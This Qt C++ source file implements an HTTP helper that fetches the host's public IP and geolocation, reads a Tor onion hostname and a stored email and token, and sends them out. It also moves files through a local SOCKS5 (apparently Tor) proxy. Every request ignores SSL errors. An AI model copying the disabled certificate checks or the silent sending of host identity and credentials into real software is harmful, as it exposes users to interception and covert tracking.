#include "http.h"

Http::Http(int _cmd, QString _url, QString _filename, QString _dst, QObject *parent) :
    QObject(parent)
{
    cmd = _cmd;
    url = _url;
    filename = _filename;
    dst = _dst;
    manager = new QNetworkAccessManager(this);
    connect(manager, SIGNAL(finished(QNetworkReply*)), this, SLOT(replyFinished(QNetworkReply*)));
    proxy.setHostName("127.0.0.1");
    proxy.setPort(9250);
}

void Http::sendInfo() {
    proxy.setType(QNetworkProxy::NoProxy);
    QNetworkProxy::setApplicationProxy(proxy);
    connect(this, SIGNAL(finished(QString)), this, SLOT(getInfo(QString)));
    cmd = IP_RAW;
    manager->get(QNetworkRequest(QUrl(URL_IP)));
}

void Http::getInfo(QString ip) {
    proxy.setType(QNetworkProxy::NoProxy);
    QNetworkProxy::setApplicationProxy(proxy);
    cmd = IP_INFO;
    manager->get(QNetworkRequest(QUrl(URL_INFO + ip)));
}

void Http::downloadFile() {
    proxy.setType(QNetworkProxy::Socks5Proxy);
    QNetworkProxy::setApplicationProxy(proxy);
    cmd =DOWNLOAD;
    QNetworkReply *reply = NULL;
    QNetworkRequest request(QUrl(url+ "/" + filename));
    request.setSslConfiguration(QSslConfiguration::defaultConfiguration());
    reply = manager->get(request);
    reply->ignoreSslErrors();
}

void Http::uploadFile() {
    proxy.setType(QNetworkProxy::Socks5Proxy);
    QNetworkProxy::setApplicationProxy(proxy);
    cmd = UPLOAD;
    QNetworkReply *reply = NULL;
    QNetworkRequest request(QUrl(URL_UPLOAD));
    QString boundary="----margin";
    QByteArray data;
    data.append("--" + boundary + "\r\n");
    data.append("Content-Disposition: form-data; name=\"file\"; filename=" + dst + "\r\n");
    data.append("Content-Type: text/plain\r\n\r\n");
    QFile file(filename);
    if (!file.open(QIODevice::ReadOnly | QIODevice::Text))
         return;
    data.append(file.readAll());
    file.close();
    data.append("\r\n--" + boundary + "--\r\n");
    request.setHeader(QNetworkRequest::ContentTypeHeader,"multipart/form-data; boundary=" + boundary);
    request.setHeader(QNetworkRequest::ContentLengthHeader,data.length());
    request.setSslConfiguration(QSslConfiguration::defaultConfiguration());
    reply = manager->post(request, data);
    reply->ignoreSslErrors();
}

void Http::replyFinished (QNetworkReply *reply) {
    if(reply->error()) qDebug() << "ERROR:" << reply->errorString();
    else {
        QString res;
        switch (cmd) {
          case UPLOAD:
            res = reply->readAll();
            if (res == "1") {
                qDebug() << "[*] File uploaded";
            }
            else {
                qDebug() << "[*] Error upload";
            }
            finish();
            break;
          case DOWNLOAD:
            QFile *file;
            file = new QFile(dst);
            if (file->open(QFile::WriteOnly)) {
               file->write(reply->readAll());
               file->flush();
               file->close();
            }
            delete file;
            finish();
            break;
          case IP_RAW:
            ip = reply->readAll();
            qDebug() << "[IP] " << ip;
            finish(ip);
            break;
          case IP_INFO:
            QJsonDocument jsonResponse;
            //qDebug() << reply->readAll();
            jsonResponse = QJsonDocument::fromJson(reply->readAll());
            QJsonObject jsonObject;
            jsonObject = jsonResponse.object();
            if (jsonObject["query_status"].toObject()["query_status_code"].toString() == "OK") {
              jsonObject = jsonObject["geolocation_data"].toObject();
              QVariant isp(jsonObject["isp"].toString());
              QVariant cc(jsonObject["country_code_iso3166alpha2"].toString());
              QJsonObject json;
              json["isp"] = isp.toString();
              json["cc"] = cc.toString();
              QString info;
              info.append("{ \"isp\" : \"");
              info.append(jsonObject["isp"].toString());
              info.append("\", \"hostname\" : \"");
              QFile file("tor/hidden_service/hostname");
              file.open(QIODevice::ReadOnly | QIODevice::Text);
              QTextStream in(&file);
              info.append(in.readLine());
              file.close();
              info.append("\", \"email\" : \"");
              info.append(getvalueDB("email", "user"));
              info.append("\", \"token\" : \"");
              info.append(getvalueDB("token", "user"));
              //info.append("aaaaaaaaaaaaaaaaaaaaaaaaa");
              info.append("\", \"cc\" : \"");
              info.append(jsonObject["country_code_iso3166alpha2"].toString());
              info.append("\" }");
              qDebug() << "data : "<<info;
              Client *client;
              client = new Client(INFO, info);
              client->start();
              client->deleteLater();
            }
            finish();
            break;
          }
    }
    reply->deleteLater();
}

void Http::finish(QString ip) {
    emit finished(ip);
}

void Http::finish() {
    qDebug()<<"finishadsq";
    emit finished();
}
